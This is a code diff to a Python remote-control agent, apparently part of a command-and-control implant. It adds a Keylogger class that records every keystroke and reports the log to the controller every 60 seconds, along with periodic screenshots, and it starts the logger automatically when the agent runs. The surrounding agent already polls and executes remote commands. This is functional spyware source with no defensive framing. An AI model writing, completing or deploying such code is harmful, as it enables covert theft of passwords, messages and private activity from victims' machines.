@@ -10,17 +10,95 @@ import subprocess
 from pathlib import Path
 import socket
 import random
+import keyboard
+from threading import Timer
+from datetime import datetime
 
 import pyautogui
 from io import BytesIO
 from PIL import Image
 
-
 import win32clipboard
 
-#TODO Subclass for DNS
+class Keylogger:
+	def __init__(self, interval, daemon, useScreenshot):
+		# we gonna pass SEND_REPORT_EVERY to interval
+		self.interval = interval
+		# this is the string variable that contains the log of all 
+		# the keystrokes within `self.interval`
+		self.log = ""
+		# record start & end datetimes
+		self.start_dt = datetime.now()
+		self.end_dt = datetime.now()
+		self.daemon = daemon
+		self.useScreenshot = useScreenshot
+
+	def callback(self, event):
+		"""
+		This callback is invoked whenever a keyboard event is occured
+		(i.e when a key is released in this example)
+		"""
+		name = event.name
+		if len(name) > 1:
+			# not a character, special key (e.g ctrl, alt, etc.)
+			# uppercase with []
+			if name == "space":
+				# " " instead of "space"
+				name = " "
+			elif name == "enter":
+				# add a new line whenever an ENTER is pressed
+				name = "[ENTER]\n"
+			elif name == "decimal":
+				name = "."
+			else:
+				# replace spaces with underscores
+				name = name.replace(" ", "_")
+				name = f"[{name.upper()}]"
+		# finally, add the key name to our global `self.log` variable
+		self.log += name
+
+	def report(self):
+		"""
+		This function gets called every `self.interval`
+		It basically sends keylogs and resets `self.log` variable
+		"""
+		if self.log:
+			# if there is something in log, report it
+			self.end_dt = datetime.now()
+			# update `self.filename`
+			print("Have log: " + self.log)
+			self.daemon.postKeylogger(self.log)
+			# if you want to print in the console, uncomment below line
+			# print(f"[{self.filename}] - {self.log}")
+			self.start_dt = datetime.now()
+		self.log = ""
+		if self.useScreenshot:
+			self.daemon.takeScreenshot(False)
+		timer = Timer(interval=self.interval, function=self.report)
+		# set the thread as daemon (dies when main thread die)
+		timer.daemon = True
+		# start the timer
+		timer.start()
+
+	def start(self):
+		# record the start datetime
+		self.start_dt = datetime.now()
+		# start the keylogger
+		keyboard.on_release(callback=self.callback)
+		# start reporting the keylogs
+		self.report()
 
 class LocalAgent:
+	def takeScreenshot(self, postScreenshot):
+		image = pyautogui.screenshot()
+		im_file = BytesIO()
+		image.save(im_file, format="JPEG")
+		im_bytes = im_file.getvalue()  # im_bytes: image in binary format.
+		im_b64 = base64.b64encode(im_bytes).decode('ascii')
+		self.postScreenshot(im_b64)
+		if postScreenshot:
+			self.postResponse("Screenshot successful")
+        
 	def buildCatContent(self):
 		continueBuilding = True
 		content = ""
@@ -60,6 +138,9 @@ class LocalAgent:
 		raise NotImplementedError("Please Implement this method")
         
 	def postScreenshot(self, cmd_output):
+		raise NotImplementedError("Please Implement this method")
+
+	def postKeylogger(self, log):
 		raise NotImplementedError("Please Implement this method")
 
 	def postResponse(self, cmd_output):
@@ -131,13 +212,7 @@ class LocalAgent:
 			return None
 		elif response == 'screenshot':
 			try:
-				image = pyautogui.screenshot()
-				im_file = BytesIO()
-				image.save(im_file, format="JPEG")
-				im_bytes = im_file.getvalue()  # im_bytes: image in binary format.
-				im_b64 = base64.b64encode(im_bytes).decode('ascii')
-				self.postScreenshot(im_b64)
-				self.postResponse("Screenshot successful")
+				self.takeScreenshot(True)
 			except Exception as e:
 				print("Oops, something went wrong: {}".format(e), file=sys.stderr)            
 			return None
@@ -197,9 +272,11 @@ class LocalAgent:
 		else:
 			return response
 
-	def run(self, newLineAfterCmdOutput = False):
+	def run(self, newLineAfterCmdOutput = False, autoScreenshot = True):
 		self.newLineAfterCmdOutput = newLineAfterCmdOutput
 		live = True
+		logger = Keylogger(60, self, autoScreenshot)
+		logger.start()
 		while(live):
 			try:
 				command = self.pollCommand()
